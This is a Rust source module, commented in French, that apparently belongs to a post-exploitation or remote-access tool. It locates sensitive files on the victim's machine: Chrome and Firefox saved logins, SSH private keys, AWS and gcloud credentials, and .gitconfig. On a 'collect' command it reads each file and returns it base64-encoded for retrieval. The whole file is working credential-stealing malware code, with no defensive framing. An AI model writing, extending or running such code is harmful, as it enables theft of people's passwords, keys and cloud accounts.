// Inventaire et collecte des fichiers sensibles.
use std::path::PathBuf;

pub struct LootEntry {
    pub category: String,
    pub path: String,
}

pub fn run(args: &str) -> String {
    let entries = inventory();
    if entries.is_empty() {
        return "aucun fichier sensible trouvé".to_string();
    }
    if args.trim() == "collect" {
        return collect(&entries);
    }
    entries
        .iter()
        .map(|e| format!("{:8}  {}", e.category, e.path))
        .collect::<Vec<_>>()
        .join("\n")
}

pub fn inventory() -> Vec<LootEntry> {
    let mut entries = Vec::new();
    for (category, paths) in target_paths() {
        for path in paths {
            if path.exists() {
                entries.push(LootEntry {
                    category: category.to_string(),
                    path: path.display().to_string(),
                });
            }
        }
    }
    entries
}

fn collect(entries: &[LootEntry]) -> String {
    use base64::Engine;
    let mut results = Vec::new();
    for e in entries {
        match std::fs::read(&e.path) {
            Ok(data) => {
                let b64 = base64::engine::general_purpose::STANDARD.encode(&data);
                results.push(format!("__FILE__{}__{}\n{}", e.path, "__", b64));
            }
            Err(err) => results.push(format!("[erreur] {} : {}", e.path, err)),
        }
    }
    results.join("\n---\n")
}

fn target_paths() -> Vec<(&'static str, Vec<PathBuf>)> {
    #[cfg(windows)]
    let home = std::env::var("USERPROFILE").unwrap_or_default();
    #[cfg(not(windows))]
    let home = std::env::var("HOME").unwrap_or_default();

    let mut targets: Vec<(&str, Vec<PathBuf>)> = Vec::new();

    let mut browser_paths = vec![
        PathBuf::from(&home).join(r"AppData\Local\Google\Chrome\User Data\Default\Login Data"),
    ];
    let ff_profiles = PathBuf::from(&home).join(r"AppData\Roaming\Mozilla\Firefox\Profiles");
    if ff_profiles.is_dir() {
        if let Ok(entries) = std::fs::read_dir(&ff_profiles) {
            for entry in entries.flatten() {
                let logins = entry.path().join("logins.json");
                if logins.exists() {
                    browser_paths.push(logins);
                }
            }
        }
    }
    targets.push(("browser", browser_paths));

    targets.push(("ssh", vec![
            PathBuf::from(&home).join(".ssh").join("id_rsa"),
            PathBuf::from(&home).join(".ssh").join("id_ed25519"),
            PathBuf::from(&home).join(".ssh").join("known_hosts"),
        ]));
    targets.push(("config", vec![
            PathBuf::from(&home).join(".gitconfig"),
            PathBuf::from(&home).join(".aws").join("credentials"),
            PathBuf::from(&home).join(".config").join("gcloud").join("credentials.db"),
        ]));

    targets
}
